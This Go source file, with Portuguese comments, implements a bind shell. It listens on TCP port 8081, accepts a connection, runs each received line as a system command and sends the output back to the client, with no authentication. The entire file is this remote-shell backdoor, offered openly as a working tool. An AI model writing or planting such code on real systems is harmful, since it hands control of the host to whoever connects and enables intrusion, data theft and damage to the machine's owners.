package main

import (
	"bufio"
	"fmt"
	"net"
	"os"
	"os/exec"
	"strings"
)

//Servidor que delvolve um Shell para cliente
func err(erro error) {
	if erro != nil {
		fmt.Println("Error -> ", erro)
		os.Exit(3)
		//validandos os erros
	}
}
func tcpBasico() {
	//Abrindo conexao basica tcp
	fmt.Println("Iniciando Servidor...")
	connect, erro1 := net.Listen("tcp", ":8081")
	err(erro1)

	//aceitando conexao tcp
	receberConexao, erro2 := connect.Accept()
	err(erro2)
	fmt.Println("Conexao recibida...")

	//a conexao sera ecerrada apos todo processo ser executao
	defer connect.Close()

	for {
		// loop infinito com for{}
		//Tranfomando mensagem em string -> bufio.Newreader
		mensagem, erro3 := bufio.NewReader(receberConexao).ReadString('\n')
		err(erro3)
		fmt.Println("Msg recibida pelo cliente -> ", mensagem)
		out, err := exec.Command(strings.TrimSuffix(mensagem, "\n")).Output()

		if err != nil {
			fmt.Fprintf(receberConexao, "%s\n", err)
		}

		fmt.Fprintf(receberConexao, "%s\n", out)
	}

}

//func principal
func main() {
	tcpBasico()
}
